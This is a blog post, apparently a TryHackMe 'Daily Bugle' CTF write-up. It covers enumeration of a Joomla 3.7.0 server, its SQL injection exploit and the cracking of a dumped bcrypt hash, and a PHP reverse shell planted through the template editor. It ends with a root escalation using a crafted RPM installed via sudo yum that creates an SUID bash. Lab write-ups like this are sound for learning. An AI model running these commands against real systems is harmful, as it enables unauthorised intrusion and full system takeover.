<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Daily Bugle :: northmatrix</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Overview Daily Bugle is a Spider-Man-themed TryHackMe room where the objective is to gain root access to a target server running a vulnerable Joomla CMS. The challenge focuses on web enumeration, CMS exploitation, and privilege escalation.
Enumeration As always i begin by running an nmap scan against the target machine specifying that all ports should be scanned and to run the
scan at insane speed using the full TCP handshake.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/posts/2025-07-09-daily-bugle/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="//localhost:1313/terminal.css">




<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="northmatrix.github.io" />
  
    <meta name="twitter:creator" content="northmatrix" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Daily Bugle">
<meta property="og:description" content="Overview Daily Bugle is a Spider-Man-themed TryHackMe room where the objective is to gain root access to a target server running a vulnerable Joomla CMS. The challenge focuses on web enumeration, CMS exploitation, and privilege escalation.
Enumeration As always i begin by running an nmap scan against the target machine specifying that all ports should be scanned and to run the
scan at insane speed using the full TCP handshake.
" />
<meta property="og:url" content="//localhost:1313/posts/2025-07-09-daily-bugle/" />
<meta property="og:site_name" content="northmatrix" />

  <meta property="og:image" content="//localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="tryhackme" />













  
  <link rel="stylesheet" href="/css/syntax.css">
</head>
<body>


<div class="container full">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Northmatrix
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/showcase" >Showcase</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/2025-07-09-daily-bugle/">Daily Bugle</a>
  </h1>
  <div class="post-meta"><span class="post-author">northmatrix</span><span class="post-reading-time">8 min read (1653 words)</span></div>

  
    <span class="post-tags">
      
      #<a href="//localhost:1313/tags/sqli/">sqli</a>&nbsp;
      
      #<a href="//localhost:1313/tags/rev-shell/">rev-shell</a>&nbsp;
      
      #<a href="//localhost:1313/tags/cms/">cms</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Daily Bugle is a Spider-Man-themed TryHackMe room where the objective is to gain root access to a target server running a vulnerable Joomla CMS. The challenge focuses on web enumeration, CMS exploitation, and privilege escalation.</p>
<p><img src="daily-bugle-card.png" alt=""></p>
<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>As always i begin by running an nmap scan against the target machine specifying that all ports should be scanned and to run the<br>
scan at <em>insane</em> speed using the full TCP handshake.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# nmap -sT -T5 -p- 10.10.161.54
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-09 02:11 BST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-161-54.eu-west-1.compute.internal <span class="o">(</span>10.10.161.54<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0010s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">3306/tcp open  mysql
</span></span><span class="line"><span class="cl">MAC Address: 02:0C:2B:1C:10:E5 <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 5.21 seconds
</span></span></code></pre></div><p>Here we can see a SSH service running this is running on all CTF machines so is nothing out of the ordinary we can also see a webserver running on port 80 and a MySQL database running on port 3306. Visiting the web server on port 80 gives us our first flag.</p>
<p>Now onto the next part of the CTF visiting port 3306 seems to be a dead as we are not allowed to connect to it so we will concentrate on the webserver. Lets begin by running a directory scan using gobuster.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# gobuster dir -u http://10.10.161.54/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.161.54/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 206<span class="o">]</span>
</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 211<span class="o">]</span>
</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 211<span class="o">]</span>
</span></span><span class="line"><span class="cl">/administrator        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 242<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/administrator/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/bin                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 232<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/bin/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/cache                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/cache/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 210<span class="o">]</span>
</span></span><span class="line"><span class="cl">/components           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 239<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/components/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/includes             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/includes/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/language             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/language/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/layouts              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/layouts/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/libraries            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/libraries/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 9278<span class="o">]</span>
</span></span><span class="line"><span class="cl">/media                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/media/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/modules/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/plugins/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 836<span class="o">]</span>
</span></span><span class="line"><span class="cl">/templates            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/templates/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/tmp                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 232<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.161.54/tmp/<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">4655</span> / <span class="m">4656</span> <span class="o">(</span>99.98%<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Additionally we will also see if we can get more information from nmap using the <code>-A</code> flag. For an aggressive scan.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# nmap -sT -T5 -p <span class="m">80</span> -A  10.10.161.54
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-09 02:19 BST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-161-54.eu-west-1.compute.internal <span class="o">(</span>10.10.161.54<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.6.40<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Joomla! - Open Source Content Management
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">15</span> disallowed entries 
</span></span><span class="line"><span class="cl"><span class="p">|</span> /joomla/administrator/ /administrator/ /bin/ /cache/ 
</span></span><span class="line"><span class="cl"><span class="p">|</span> /cli/ /components/ /includes/ /installation/ /language/ 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.6.40
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Home
</span></span><span class="line"><span class="cl">MAC Address: 02:0C:2B:1C:10:E5 <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span></span><span class="line"><span class="cl">Aggressive OS guesses: Linux 3.10 - 3.13 <span class="o">(</span>99%<span class="o">)</span>, Linux 3.8 <span class="o">(</span>96%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>93%<span class="o">)</span>, AXIS 210A or <span class="m">211</span> Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Linux 3.10 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.12 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.19 <span class="o">(</span>92%<span class="o">)</span>
</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Network Distance: <span class="m">1</span> hop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">TRACEROUTE
</span></span><span class="line"><span class="cl">HOP RTT     ADDRESS
</span></span><span class="line"><span class="cl"><span class="m">1</span>   0.56 ms ip-10-10-161-54.eu-west-1.compute.internal <span class="o">(</span>10.10.161.54<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.01 seconds
</span></span></code></pre></div><p>We now know that Joomla is being used although the answer did hint at this. Anyway we can now attempt to enumerate the version of Joomla being used to do this i first tried using scripts offered by nmap but they did not provide any useful information. Eventually i found a Joomla enumeration script called <em>juumla</em> which worked. I downloaded it from the git repo <a href="https://github.com/000pp/juumla">https://github.com/000pp/juumla</a> and ran it using the python interpreter specifying the target url.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# python3 main.py  -u http://10.10.161.54
</span></span><span class="line"><span class="cl">jUuMlA - 0.1.6
</span></span><span class="line"><span class="cl">most overrated joomla scanner
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connected successfully to http://10.10.161.54/administrator/
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Checking <span class="k">if</span> target is running Joomla...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Running Joomla version scanner! <span class="o">(</span>1/3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Joomla version is: 3.7.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Running Joomla vulnerabilities scanner! <span class="o">(</span>2/3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Joomla! Core 3.9.1 - Persistent Cross-Site Scripting in Global Configuration Textfilter Settings
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Joomla! 3.7 - SQL Injection
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Vulnerabilities scanner finished! <span class="o">(</span>2/3<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Running backup and config files scanner! <span class="o">(</span>3/3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Backup and config files scanner finished! <span class="o">(</span>3/3<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@ip-10-10-133-82:~/juumla# 
</span></span></code></pre></div><p>From this we can see that we are running version <em>3.7.0</em> this is the second answer in the room also.</p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>After doing a bit of research on the Joomla 3.7.0 SQL Injection vulnerability i found a github repository containing an exploit that could be run. I cloned this repo and ran it specifying the target machine. From this i was able to extract a user record from the users table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# python3 joomblah.py http://10.10.151.89
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">   .---.    .-<span class="s1">&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
</span></span><span class="line"><span class="cl">   <span class="p">|</span>   <span class="p">|</span>   <span class="s1">&#39;   _    \     &#39;</span>   _    <span class="se">\ </span>                           .---.                        
</span></span><span class="line"><span class="cl">   <span class="s1">&#39;---&#39;</span> /   /<span class="sb">`</span> <span class="s1">&#39;.   \  /   /` &#39;</span>.   <span class="se">\ </span> __  __   ___   /<span class="p">|</span>        <span class="p">|</span>   <span class="p">|</span>            .           
</span></span><span class="line"><span class="cl">   .---..   <span class="p">|</span>     <span class="se">\ </span> <span class="s1">&#39; .   |     \  &#39;</span> <span class="p">|</span>  <span class="p">|</span>/  <span class="sb">`</span>.<span class="s1">&#39;   `. ||        |   |          .&#39;</span><span class="p">|</span>           
</span></span><span class="line"><span class="cl">   <span class="p">|</span>   <span class="o">||</span>   <span class="s1">&#39;      |  &#39;</span><span class="p">|</span>   <span class="s1">&#39;      |  &#39;</span><span class="p">|</span>   .-.  .-.   <span class="s1">&#39;||        |   |         &lt;  |           
</span></span></span><span class="line"><span class="cl"><span class="s1">   |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
</span></span></span><span class="line"><span class="cl"><span class="s1">   |   | `.   ` ..&#39;</span> /   <span class="sb">`</span>.   <span class="sb">`</span> ..<span class="s1">&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span class="s1">&#39;. |   | .:--.&#39;</span>.  <span class="p">|</span> <span class="p">|</span> .<span class="s1">&#39;&#39;&#39;-.    
</span></span></span><span class="line"><span class="cl"><span class="s1">   |   |    &#39;</span>-...-<span class="s1">&#39;`       &#39;</span>-...-<span class="s1">&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span class="s1">&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span class="se">\ </span>  
</span></span><span class="line"><span class="cl">   <span class="p">|</span>   <span class="p">|</span>                              <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="o">||</span><span class="p">|</span>     <span class="p">|</span> <span class="o">||</span>   <span class="p">|</span><span class="sb">`</span><span class="s2">&#34; __ | | |  /    | |   
</span></span></span><span class="line"><span class="cl"><span class="s2">   |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
</span></span></span><span class="line"><span class="cl"><span class="s2">__.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
</span></span></span><span class="line"><span class="cl"><span class="s2">|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
</span></span></span><span class="line"><span class="cl"><span class="s2">|____.&#39;                                                                `--&#39;  `&#34;</span> <span class="s1">&#39;---&#39;</span>   <span class="s1">&#39;---&#39;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">[</span>-<span class="o">]</span> Fetching CSRF token
</span></span><span class="line"><span class="cl"> <span class="o">[</span>-<span class="o">]</span> Testing SQLi
</span></span><span class="line"><span class="cl">  -  Found table: fb9j5_users
</span></span><span class="line"><span class="cl">  -  Extracting users from fb9j5_users
</span></span><span class="line"><span class="cl"> <span class="o">[</span>$<span class="o">]</span> Found user <span class="o">[</span><span class="s1">&#39;811&#39;</span>, <span class="s1">&#39;Super User&#39;</span>, <span class="s1">&#39;jonah&#39;</span>, <span class="s1">&#39;jonah@tryhackme.com&#39;</span>, <span class="s1">&#39;$2y$10$0veO/JSFh4***********.******.*********.V.d3p12kBtZutm&#39;</span>, <span class="s1">&#39;&#39;</span>, <span class="s1">&#39;&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">  -  Extracting sessions from fb9j5_session
</span></span></code></pre></div><p>Now that we have this information we can attempt to crack the hash. This will allow us to access the Joomla administration page.<br>
Using the <code>hashinator</code> command i was able to find that the it is a <em>bcrypt</em> hash. This type of hash is designed to be resistant to GPU attacks so we might as well use john the ripper for this.</p>
<blockquote>
<p>The correct password was quite a bit into the wordlist so it may take a while to crack the hash.<br>
{:.prompt-info }</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-133-82:~# john --format<span class="o">=</span>bcrypt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyoumini.txt main.hash
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">sp*******123     <span class="o">(</span>?<span class="o">)</span>
</span></span><span class="line"><span class="cl">1g 0:00:00:30 DONE <span class="o">(</span>2025-07-09 12:57<span class="o">)</span> 0.03267g/s 60.00p/s 60.00c/s 60.00C/s tiffany3..spider123
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed
</span></span></code></pre></div><p>Now we know the password and can login to the Joomla administration page this password is also one of the answers in the room. Now that I have access to the Admin page I began looking for ways to upload my own PHP script i eventually found out that i was able to abuse the templating system in order to upload my own PHP script that would be run by the server. I used pentest monkeys PHP reverse shell as my revshell payload in this room and replaced the index.php with the reverse shell.</p>
<p><img src="joomla-template-page-reverse-shell.png" alt="Joomla Template"></p>
<p>Anyway after uploading this script and then visiting the index.php page the server then reached out to a netcat listener that i had setup listening on port 1234. From here i followed by usual steps to get an interactive shell specifically.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">CTRL+Z
</span></span><span class="line"><span class="cl">stty raw -echo
</span></span><span class="line"><span class="cl"><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">stty rows <span class="m">40</span> columns <span class="m">120</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Anyway running whoami shows that i am the apache. Initially i began looking around the filesystem to see if there were any incorrectly configured permissions but could not find any. I also could not find any immediately obvious privileged escalation paths such as SUID or cronjobs. So i began looking deeper into the directory that i already had permission to view in particular <code>/var/www/html</code> here i found a PHP file <code>configuration.php</code> containing the password for the MySQL database. I was able to use this password to login to the <code>jjameson</code> user account.</p>
<p>After gaining access to this account i was able to view the flag located in the users home directory additionally i checked to see if i had permission to run any commands with sudo. Doing so i see that i am able to run the <code>yum</code> command looking this up on gtfobins i was able to see that i could exploit it with a specially crafted rpm package.</p>
<p>Below is the rpm package i created with <code>fpm</code> i set up a simple python http server on my host and downloaded it to the target machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#39;</span> &gt; <span class="nv">$TF</span>/x.sh
</span></span><span class="line"><span class="cl">chmod +x <span class="nv">$TF</span>/x.sh
</span></span><span class="line"><span class="cl">fpm -n x -s dir -t rpm -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</span></span></code></pre></div><p>Now all i had to do is use yum to install the package which created a bash shell with SUID bit set in <code>/tmp/rootbash</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo yum localinstall -y x-1.0-1.noarch.rpm
</span></span></code></pre></div><p>Running <code>./rootbash -p</code> from within <code>/tmp</code> directory gives us a root shell and i can now read the flag located in the users root directory.</p>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Read other posts</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="//localhost:1313/posts/2025-07-10-cryptosystem/" class="button inline prev">
        &lt; [<span class="button__text">Cryptosystem</span>]
      </a>
    
    
      ::
    
    
      <a href="//localhost:1313/posts/2025-07-07-game-zone/" class="button inline next">
         [<span class="button__text">Game Zone</span>] &gt;
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
